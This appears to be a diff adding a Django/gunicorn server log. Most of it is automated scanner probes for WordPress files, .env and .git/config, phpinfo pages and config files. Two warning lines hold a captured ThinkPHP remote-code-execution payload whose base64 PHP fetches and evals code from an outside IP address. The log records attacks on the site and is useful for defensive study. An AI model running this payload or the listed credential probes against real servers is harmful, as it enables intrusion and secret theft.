+Not Found: //wp2/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+Not Found: //sito/wp-includes/wlwmanifest.xml
+Not Found: /autodiscover/autodiscover.json
+[02/Feb/2024 14:50:02] code 400, message Bad request version ('F\x07\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00bbXcsXctst\x00\x00\x00\x00\x00\x00')
+[02/Feb/2024 14:50:02] "   TZ          0I    ¨À )t F tsXrcsXYs9                      bbXcsXctst      " 400 -
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+/home/ubuntu/projects/mysite/scoopadive/user_profile/views.py:29: UnorderedObjectListWarning: Pagination may yield inconsistent results with an unordered object_list: <class 'main.models.Log'> QuerySet.
+  paginatorLog = Paginator(loglist, 5)
+/home/ubuntu/projects/mysite/scoopadive/user_profile/views.py:30: UnorderedObjectListWarning: Pagination may yield inconsistent results with an unordered object_list: <class 'board.models.Post'> QuerySet.
+  paginatorPost = Paginator(postlist, 5)
+[2024-02-03 01:12:24 +0900] [238462] [CRITICAL] WORKER TIMEOUT (pid:377816)
+[2024-02-02 16:12:25 +0000] [377816] [INFO] Worker exiting (pid: 377816)
+BASE_DIR: /home/ubuntu/projects/mysite/scoopadive
+STATIC_ROOT: /home/ubuntu/projects/mysite/scoopadive/main/static
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+[2024-02-03 01:12:25 +0900] [238462] [ERROR] Worker (pid:377816) was sent SIGKILL! Perhaps out of memory?
+[2024-02-03 01:12:25 +0900] [397804] [INFO] Booting worker with pid: 397804
+Not Found: /.DS_Store
+Not Found: /Core/Skin/Login.aspx
+Not Found: //wp-includes/wlwmanifest.xml
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //website/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
+Not Found: //news/wp-includes/wlwmanifest.xml
+Not Found: //2018/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
+Not Found: //media/wp-includes/wlwmanifest.xml
+Not Found: //wp2/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+Not Found: //sito/wp-includes/wlwmanifest.xml
+Not Found: /.vscode/sftp.json
+Not Found: //wp-includes/ID3/license.txt
+Not Found: //feed/
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
+Not Found: //2020/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //2021/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+Not Found: /.svn
+[02/Feb/2024 21:03:04] code 400, message Bad request syntax ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03e¼±}\x00T\x83')
+[02/Feb/2024 21:03:04] You're accessing the development server over HTTPS, but it only supports HTTP.
+[02/Feb/2024 21:03:04] code 400, message Bad request version ('À\x14À')
+[02/Feb/2024 21:03:04] You're accessing the development server over HTTPS, but it only supports HTTP.
+[02/Feb/2024 21:03:04] "GET / HTTP/1.1" 200 3786
+[02/Feb/2024 21:03:04] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x13\x16/\x7f,\x82D\x0e\x82kë\x81\x18\x10SÎ\x04´\x99"6\x01Ry\'¶Ã*D#lE\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+[02/Feb/2024 21:03:04] You're accessing the development server over HTTPS, but it only supports HTTP.
+Not Found: /login
+Not Found: /.svn
+Not Found: /Core/Skin/Login.aspx
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /.git/config
+Not Found: /.svn
+Not Found: /7qaS
+Not Found: /Vp4c
+Not Found: /aab8
+Not Found: /jquery-3.3.1.slim.min.js
+Not Found: /aab9
+Not Found: /jquery-3.3.2.slim.min.js
+Not Found: /LLLx
+[03/Feb/2024 00:14:08] "GET /LLLx HTTP/1.1" 404 5202
+Not Found: /NCWu
+[03/Feb/2024 00:14:09] "GET /NCWu HTTP/1.1" 404 5202
+Not Found: /aab8
+[03/Feb/2024 00:14:10] "GET /aab8 HTTP/1.1" 404 5202
+Not Found: /jquery-3.3.1.slim.min.js
+[03/Feb/2024 00:14:11] "GET /jquery-3.3.1.slim.min.js HTTP/1.1" 404 5262
+Not Found: /aab9
+[03/Feb/2024 00:14:12] "GET /aab9 HTTP/1.1" 404 5202
+Not Found: /jquery-3.3.2.slim.min.js
+[03/Feb/2024 00:14:12] "GET /jquery-3.3.2.slim.min.js HTTP/1.1" 404 5262
+Not Found: /admin.php
+Not Found: /about.php
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /Core/Skin/Login.aspx
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /.git/config
+Not Found: /3ds.php
+Not Found: /3ds.php
+Not Found: /merchant/z/payment/
+Not Found: /merchant/z/payment/
+Not Found: /3ds1633693954432212
+Not Found: /3ds1633693954432212
+Not Found: /merchant/code
+Not Found: /merchant/code
+Not Found: //wp-includes/ID3/license.txt
+Not Found: //feed/
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
+Not Found: //2020/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //2021/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+[03/Feb/2024 02:15:08] "GET / HTTP/1.1" 200 3786
+Not Found: /.env
+Not Found: /Core/Skin/Login.aspx
+Not Found: //wp-includes/wlwmanifest.xml
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //website/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
+Not Found: //news/wp-includes/wlwmanifest.xml
+Not Found: //2018/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
+Not Found: //media/wp-includes/wlwmanifest.xml
+Not Found: //wp2/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+Not Found: //sito/wp-includes/wlwmanifest.xml
+Not Found: /wp-includes/wlwmanifest.xml
+Not Found: /administrator/index.php
+Not Found: /view-source:
+Not Found: /misc/ajax.js
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+[03/Feb/2024 04:35:18] code 400, message Bad request syntax ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Þ\x84{\x17´5\x7fÿ\x96>:xÃ³')
+[03/Feb/2024 04:35:18] You're accessing the development server over HTTPS, but it only supports HTTP.
+Not Found: /robots.txt
+[03/Feb/2024 05:10:02] code 400, message Bad request version ('À\x13À')
+[03/Feb/2024 05:10:02] You're accessing the development server over HTTPS, but it only supports HTTP.
+[03/Feb/2024 05:10:03] code 400, message Bad request version ('À(À$À\x14À')
+[03/Feb/2024 05:10:03] You're accessing the development server over HTTPS, but it only supports HTTP.
+Not Found: //wp-includes/wlwmanifest.xml
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //website/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
+Not Found: //news/wp-includes/wlwmanifest.xml
+Not Found: //2020/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
+Not Found: //wp2/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+Not Found: //sito/wp-includes/wlwmanifest.xml
+[03/Feb/2024 05:23:10] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
+[03/Feb/2024 05:23:10] "    c                           " 400 -
+Not Found: /Core/Skin/Login.aspx
+Not Found: /robots.txt
+[03/Feb/2024 06:05:20] "GET / HTTP/1.1" 200 3786
+Not Found: /favicon.ico
+[03/Feb/2024 06:05:29] "GET /favicon.ico HTTP/1.1" 404 5223
+Invalid HTTP_HOST header: 'api.ipify.org'. You may need to add 'api.ipify.org' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'api.ipify.org'. You may need to add 'api.ipify.org' to ALLOWED_HOSTS.
+Bad Request: /http:/api.ipify.org/
+[03/Feb/2024 06:05:36] "GET http://api.ipify.org/?format=json HTTP/1.1" 400 63813
+Invalid HTTP_HOST header: 'www.shadowserver.org'. You may need to add 'www.shadowserver.org' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'www.shadowserver.org'. You may need to add 'www.shadowserver.org' to ALLOWED_HOSTS.
+Bad Request: /www.shadowserver.org:443
+[03/Feb/2024 06:05:39] "CONNECT www.shadowserver.org:443 HTTP/1.1" 400 64016
+[03/Feb/2024 06:07:06] "GET / HTTP/1.1" 200 3786
+[03/Feb/2024 06:28:37] "GET / HTTP/1.1" 200 3786
+[03/Feb/2024 06:28:38,405] - Broken pipe from ('165.154.206.139', 57578)
+[03/Feb/2024 06:28:38] code 400, message Bad request version ('À\x13À')
+[03/Feb/2024 06:28:38] You're accessing the development server over HTTPS, but it only supports HTTP.
+[03/Feb/2024 06:28:39] code 400, message Bad HTTP/0.9 request type ('t3')
+[03/Feb/2024 06:28:39] "t3 12.1.2" 400 -
+Not Found: /.env
+Not Found: /actuator/gateway/routes
+Not Found: /ziypcxjgnbtwvhe
+Not Found: /v1/management/tenant/getTenantConfig
+Not Found: /mobile/v3/js/lotterys.js
+Not Found: /check
+Not Found: /assets/js/video.js
+Not Found: /js/app.style2.js
+Not Found: /user/regok.php
+Not Found: /api/nimcc/recv
+Not Found: /index/newapi/api
+Not Found: /resources/main/common.js
+Not Found: /api/service
+Not Found: /api/shares/systemStyle
+Not Found: /api/currency/quotation_new
+Not Found: /__error_/static/_errorPageModule.js
+Not Found: /Ajax/allcoin_a
+Not Found: /Public/mobile/js/config.js
+Not Found: /site/info
+Not Found: /template/mobile_user/ask_list.html
+Not Found: /dianjianniu.js
+Not Found: /nyyh/ac_runactivecontent.js
+Not Found: /service
+Not Found: /index/lotteryHall.do
+Not Found: /service
+Not Found: /_xingcai_buffer/systemSettings
+Not Found: /configstatic/h5/control/control.js
+Not Found: /api/site/getInfo.do
+Not Found: /res/dou/login.css
+Not Found: /template/mb/lang/text-zh.json
+Not Found: /checkusername
+Not Found: /doLogin
+Not Found: /dist/images/mask/colsed.png
+Not Found: /loop/fiveData
+Not Found: /melody/api/v1/retgistercolumn/list
+Not Found: /api/ipa/download_app_info
+Not Found: /views/bank/bank.html
+Not Found: /cron/bet/lastKj
+Not Found: /Home/SendSMSCodeToPhoneFromAdmin
+Not Found: /Pay/index.php
+Not Found: /User/login.html
+Not Found: /index/index/vhash
+Not Found: /ws/index/weblogo/app
+Not Found: /Six/Js/class_12.js
+Not Found: /index.php
+Not Found: /api/shop/product
+Not Found: /api/pc/helper/terms
+Not Found: /Public/home/common/js/index.js
+Not Found: /index/index/cx
+Not Found: /index.php/games/red
+Not Found: /app/public/config/index.php
+Not Found: /public/home/js/func.js
+Not Found: /api/index/index
+Not Found: /api/market/currency_matches
+Not Found: /config.js
+Not Found: /templates/hyacinth/js/common.js
+Not Found: /api/link/platform
+Not Found: /api/product/list/index
+Not Found: /index.php
+Not Found: /index.html
+Not Found: /welive.js
+Not Found: /auth/web/login/webLoginEwm
+Not Found: /api/user/drawList
+Not Found: /Home/Get/getIndexLunshu
+Not Found: /init.js
+Not Found: /api/uploads/getappconfig
+Not Found: /Pc/tools/outpwd_smsverify
+Not Found: /Public/Home/statics/web/js/style.js
+Not Found: /Scripts/Chat
+Not Found: /index/login/getWays
+Not Found: /api/index/webconfig
+Not Found: /js/nsc_m/res.js
+Not Found: /api/home/country/list
+Not Found: /scripts/LoadAjaxIco.js
+Not Found: /acquireSession
+Not Found: /Site/configH5
+Not Found: /home/login/login_index.html
+Not Found: /Loading.png
+Not Found: /assets/layui/resuser/room.js
+Not Found: /web/im/js/register.js
+Not Found: /js/room.js
+Not Found: /Public/Wchat/js/cvphp.js
+Not Found: /Tencent/GetGuarantee
+Not Found: /api/apps/config
+Not Found: /js/_coolchat-commons.js
+Not Found: /js/noright.js
+Not Found: /home/index/getkdata/intval/1day/type/btcusdt
+Not Found: /api/exclude/siteConfig/webSiteConfig
+Not Found: /Public/Wap/jinrong/Mobile/Public/js/drawsvg.js
+Not Found: /resource/images/404.jpg
+Not Found: /pczs/js/trendChart.js
+Not Found: /picture/imtokenlogo.svg
+Not Found: /chatroomgame
+Not Found: /1.jpg
+Not Found: /user/ajax_tm
+Not Found: /api/sms
+Not Found: /mobile/user/getImgCodeCal
+Not Found: /assets/js/daik/hm.js
+Not Found: /upload_json/
+Not Found: /common/scrollreveal.min.js
+Not Found: /Card/liu.html
+Not Found: /Home/Jiekou/ajaxLatest1
+Not Found: /api/safety/system-list
+Not Found: /Apps/gold/Tpl/Admin/Mt4Server/index.html
+Not Found: /api/index/userdded.html
+Not Found: /images/defaultpic.gif
+Not Found: /prod-api/api/mine/sys/sysConfig
+Not Found: /star.php
+Not Found: /Mg0a4/app/data.js
+Not Found: /mobile/login/register.html
+Not Found: /api/f.php
+Not Found: /active
+Not Found: /v1/common/visitor/getAgentStatus.do
+Not Found: /js/subsidy/bk.min.js
+Not Found: /x_hf.asp
+Not Found: /index/load/rebotslist.html
+Not Found: /index/index/info
+Not Found: /app/h5Api
+Not Found: /wap/api/exchangerateuserconfig!get.action
+Not Found: /api/index/logincode
+Not Found: /app/config/getConfig
+Not Found: /libs/wsBase.js
+Not Found: /home/data/get_ip_info
+Not Found: /li/user/loginck
+Not Found: /tp/
+Not Found: /pc/serverConfig.js
+Not Found: /index/index/register1/type/1.html
+Not Found: /miningpool/index
+Not Found: /jsonpublic/selectAddtion.asp
+Not Found: /js/preload/example.txt
+Not Found: /backend
+Not Found: /h5/static/icon/icon_hetong.png
+Not Found: /Public/statics/js/iconfont.js
+Not Found: /en/autonews.html
+Not Found: /img/default/gaba.png
+Not Found: /images/adminlo.png
+Not Found: /api/v1/product/category
+Not Found: /index/chat/init
+Not Found: /phalapi/public/
+Not Found: /public/static/js/main.js
+Not Found: /default_drawnotice.shtml
+Not Found: /native/getStationInfo.do
+Not Found: /api/Index/down
+Not Found: /-/x/hbg/daq/user-event/info/plain
+Not Found: /api/v1/member/home
+Not Found: /resource/home/js/config.js
+Not Found: /public/js/json/code_BF_ix.json
+Not Found: /api/user/switchWeb
+Not Found: /index.php
+Not Found: /index.php/index/login/logincl
+Not Found: /Public/m/js/yxMobileSlider.js
+Not Found: /api/message/webInfo
+Not Found: /room/minilogin.php
+Not Found: /api.php
+Not Found: /platform/passport/login.html
+Not Found: /api/index/indexconfig
+Not Found: /post.asp
+Not Found: /public/message/findByType
+Not Found: /Plus/AboutUs/Images/Style.css
+Not Found: /Publics/getWebInitInfo
+Not Found: /index/user/register.html
+Not Found: /index/user/main.html
+Not Found: /text_config.js
+Not Found: /js/app.js
+Not Found: /Ajax/checkpwd.js
+Not Found: /User/Reg/
+Not Found: /history_code.shtml
+Not Found: /dist/js/regist.js
+Not Found: /api/config
+Not Found: /api/mdm/getAppInfo
+Not Found: /api/trendData
+Not Found: /app/get_shares_index
+Not Found: /phpcms/modules/member/touzi.php
+Not Found: /photo/index.asp
+Not Found: /member/css/bindmobile.js
+Not Found: /waplogin.php
+Not Found: /Application/Basic/Static/css/customerselect.css
+Not Found: /t100/icon-service.svg
+Not Found: /api/mobileweb/error
+Not Found: /api/submitCard.html
+Not Found: /wap/reportExample.shtml
+Not Found: /api/link
+Not Found: /api/baseConfig
+Not Found: /account/login
+Not Found: /setting/global
+Not Found: /newss/resources/js/pc28-betbox.js
+Not Found: /Web/JS/michat.js
+Not Found: /mobile-api/initConfig.js
+Not Found: /serveapi/tx/open/session/fffff
+Not Found: /index/login/smsRand
+Not Found: /ashx/getPlatParam.ashx
+Not Found: /v1/app/market/home/queryKlineRiseList
+Not Found: /live/getRealIP
+Not Found: /api/vue/transaction/config
+Not Found: /-_files/bj.png
+Not Found: /js/chunk-vendors.63ec85b1.js
+Not Found: /v1/user/overview/userinfo
+Not Found: /assets/yibao/Nweshebao/img/logo.png
+Not Found: /api/v1/tea/investment-project/list
+Not Found: /api/mihdy/register
+Not Found: /computer/articleContent
+Not Found: /Public/Home/css/revise.css
+Not Found: /api/common/getVersion
+Not Found: /a/web/goWeb/userTpl
+Not Found: /_data/config/config/get
+Not Found: /home/main/getConfig.do
+Not Found: /km.asmx/getPlatParam
+Not Found: /member/showSign
+Not Found: /market/index/market_bat
+Not Found: /t000/login-img-2.svg
+Not Found: /html/wechat/getkey
+Not Found: /app/member/getdata.php
+Not Found: /app/login
+Not Found: /Core/Skin/Login.aspx
+Not Found: /wp-admin/setup-config.php
+Not Found: /wp-admin/install.php
+Not Found: /readme.html
+Not Found: /license.txt
+Not Found: /wordpress/
+Not Found: /wp/
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /sitemap.xml
+Not Found: /robots.txt
+Not Found: /sitemap.xml
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /sitemap.xml
+Not Found: /wp-login.php
+[03/Feb/2024 09:07:09] code 400, message Bad request syntax ('nil')
+[03/Feb/2024 09:07:09] "nil" 400 -
+[03/Feb/2024 09:07:18] "GET / HTTP/1.0" 200 3786
+[03/Feb/2024 09:07:21] "GET / HTTP/1.1" 200 3786
+[03/Feb/2024 09:07:34] "GET /common/logout/ HTTP/1.1" 302 0
+Not Found: /sitemap.xml
+[03/Feb/2024 09:07:40] "GET /sitemap.xml HTTP/1.1" 404 5223
+Not Found: /robots.txt
+[03/Feb/2024 09:07:41] "GET /robots.txt HTTP/1.1" 404 5220
+[03/Feb/2024 09:21:35] code 400, message Bad request syntax ('\x01\x01æ')
+[03/Feb/2024 09:21:35] "æ" 400 -
+Not Found: /robots.txt
+Not Found: /sitemap.xml
+Not Found: /robots.txt
+Not Found: /sitemap.xml
+Invalid HTTP_HOST header: 'www.scoopadive.com'. You may need to add 'www.scoopadive.com' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'www.scoopadive.com'. You may need to add 'www.scoopadive.com' to ALLOWED_HOSTS.
+Bad Request: /
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /Core/Skin/Login.aspx
+Not Found: /sitemap.xml
+Not Found: /robots.txt
+Invalid HTTP_HOST header: 'www.scoopadive.com'. You may need to add 'www.scoopadive.com' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'www.scoopadive.com'. You may need to add 'www.scoopadive.com' to ALLOWED_HOSTS.
+Bad Request: /
+Invalid HTTP_HOST header: 'www.scoopadive.com'. You may need to add 'www.scoopadive.com' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'www.scoopadive.com'. You may need to add 'www.scoopadive.com' to ALLOWED_HOSTS.
+Bad Request: /sitemap.xml
+Invalid HTTP_HOST header: 'www.scoopadive.com'. You may need to add 'www.scoopadive.com' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'www.scoopadive.com'. You may need to add 'www.scoopadive.com' to ALLOWED_HOSTS.
+Bad Request: /robots.txt
+Not Found: /webui/
+Not Found: /geoserver/web/
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /Core/Skin/Login.aspx
+[03/Feb/2024 12:02:19,605] - Broken pipe from ('87.251.64.11', 64399)
+Not Found: /.env
+Not Found: /index.php
+Not Found: /index.php
+Not Found: /index.php
+[2024-02-03 12:26:26 +0000] [397804] [WARNING] Invalid request from ip=: Invalid HTTP Version: 'hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=eval&vars[1][]=\'eval(base64_decode("aWYoZmlsdGVyX3ZhcihpbmlfZ2V0KCJhbGxvd191cmxfZm9wZW4iKSxGSUxURVJfVkFMSURBVEVfQk9PTEVBTikpe2V2YWwoZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly85My4xMjMuMzkuNzYveCIpKTt9ZWxzZXskaD1jdXJsX2luaXQoImh0dHA6Ly85My4xMjMuMzkuNzYveCIpO2N1cmxfc2V0b3B0KCRoLENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsMSk7Y3VybF9zZXRvcHQoJGgsQ1VSTE9QVF9IRUFERVIsMCk7ZXZhbChjdXJsX2V4ZWMoJGgpKTtjdXJsX2Nsb3NlKCRoKTt9"));\' HTTP/1.0'
+[2024-02-03 12:26:26 +0000] [397804] [WARNING] Invalid request from ip=: Invalid HTTP Version: 'hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=eval&vars[1][]=\'eval(base64_decode("aWYoZmlsdGVyX3ZhcihpbmlfZ2V0KCJhbGxvd191cmxfZm9wZW4iKSxGSUxURVJfVkFMSURBVEVfQk9PTEVBTikpe2V2YWwoZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly85My4xMjMuMzkuNzYveCIpKTt9ZWxzZXskaD1jdXJsX2luaXQoImh0dHA6Ly85My4xMjMuMzkuNzYveCIpO2N1cmxfc2V0b3B0KCRoLENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsMSk7Y3VybF9zZXRvcHQoJGgsQ1VSTE9QVF9IRUFERVIsMCk7ZXZhbChjdXJsX2V4ZWMoJGgpKTtjdXJsX2Nsb3NlKCRoKTt9"));\' HTTP/1.0'
+Not Found: /.env
+Not Found: /wp-content/
+Not Found: /Core/Skin/Login.aspx
+Not Found: /.env
+Not Found: /xampp/info.php
+Not Found: /xampp/phpinfo
+Not Found: /_profiler/phpinfo
+Not Found: /phpinfo.php
+Not Found: /phpinfo
+Not Found: /info.php
+Not Found: /php.ini
+Not Found: /php.php
+Not Found: /infophp.php
+Not Found: /test.php
+Not Found: /dashboard/phpinfo.php
+Not Found: //api/phpinfo.php
+Not Found: //backend/phpinfo.php
+Not Found: //backup/phpinfo.php
+Not Found: //crm/phpinfo.php
+Not Found: //current/phpinfo.php
+Not Found: //dev/phpinfo.php
+Not Found: //develop/phpinfo.php
+Not Found: //development/phpinfo.php
+Not Found: //help/phpinfo.php
+Not Found: //helper/phpinfo.php
+Not Found: //lara/phpinfo.php
+Not Found: //laravel/phpinfo.php
+Not Found: //server/phpinfo.php
+Not Found: //service/phpinfo.php
+Not Found: //services/phpinfo.php
+Not Found: //xampp/phpinfo.php
+Not Found: //phpinfo
+Not Found: //info.php
+Not Found: //api/info.php
+Not Found: //backend/info.php
+Not Found: //backup/info.php
+Not Found: //crm/info.php
+Not Found: //current/info.php
+Not Found: //dev/info.php
+Not Found: //develop/info.php
+Not Found: //development/iinfo.php
+Not Found: //help/info.php
+Not Found: //helper/info.php
+Not Found: //lara/info.php
+Not Found: //laravel/info.php
+Not Found: //server/info.php
+Not Found: //service/info.php
+Not Found: //services/info.php
+Not Found: //xampp/info.php
+Not Found: /php-info.php
+Not Found: /linusadmin-phpinfo.php
+Not Found: /infos.php
+Not Found: /old_phpinfo.php
+Not Found: /temp.php
+Not Found: /time.php
+Not Found: /phpversion.php
+Not Found: /pinfo.php
+Not Found: /i.php
+Not Found: /asdf.php
+Not Found: /index.json
+Not Found: /config.json
+Not Found: /config/config.json
+Not Found: /info.json
+Not Found: /.config/gatsby/config.json
+Not Found: /.cordova/config.json
+Not Found: /.deployment-config.json
+Not Found: /.docker/config.json
+Not Found: /.docker/daemon.json
+Not Found: /.jupyter/jupyter_notebook_config.json
+Not Found: /.lanproxy/config.json
+Not Found: /_wpeprivate/config.json
+Not Found: /console/base/config.json
+Not Found: /console/payments/config.json
+Not Found: /server/config.json
+Not Found: /.env.bak
+Not Found: /.env
+Not Found: /config.env
+Not Found: /.env.dist
+Not Found: /.env.dev
+Not Found: /.env.local
+Not Found: /public/.env
+Not Found: /laravel/.env
+Not Found: /laravel/core/.env
+Not Found: /beta/.env
+Not Found: /kyc/.env
+Not Found: /prod/.env
+Not Found: /.env.backup
+Not Found: /.env.docker.dev
+Not Found: /.env.php
+Not Found: /.env.prod
+Not Found: /.env.production.local
+Not Found: /.env.sample.php
